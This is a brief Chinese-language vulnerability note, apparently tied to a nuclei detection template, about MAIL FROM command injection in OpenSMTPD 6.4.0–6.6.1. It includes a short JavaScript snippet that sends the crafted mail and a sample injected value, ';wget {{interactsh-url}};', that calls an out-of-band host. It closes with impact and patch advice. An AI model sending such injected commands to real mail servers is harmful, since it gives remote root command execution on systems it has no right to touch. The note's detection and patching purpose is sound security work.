验证漏洞存在方法
    - 通过SMTP客户端连接到目标端口，发送包含恶意MAIL FROM字段的邮件，观察是否能够触发命令执行

漏洞利用方法
    - OpenSMTPD在处理MAIL FROM字段时存在输入验证漏洞，攻击者可以通过在MAIL FROM字段中注入shell元字符来执行任意命令。该漏洞影响OpenSMTPD 6.4.0至6.6.1版本，在默认配置下允许远程攻击者以root权限执行任意命令。
    - ```javascript
const smtp = require('nuclei/smtp');
const client = new smtp.Client(Host,Port);
const message = new smtp.SMTPMessage();
message.From(From);
message.To(To);
message.Body(Msg);
Export(client.SendMail(message));
```

参数说明：
- Host: 目标主机地址
- Port: SMTP端口（默认8825）
- From: 恶意MAIL FROM字段，包含命令注入（如：;wget {{interactsh-url}};）
- To: 收件人地址（如：root）
- Msg: 邮件正文内容

漏洞影响：成功利用此漏洞允许攻击者以OpenSMTPD进程权限执行任意代码，可能导致系统完全被控制。

修复建议：升级到OpenSMTPD 6.6.2或更高版本，或应用相关安全补丁。
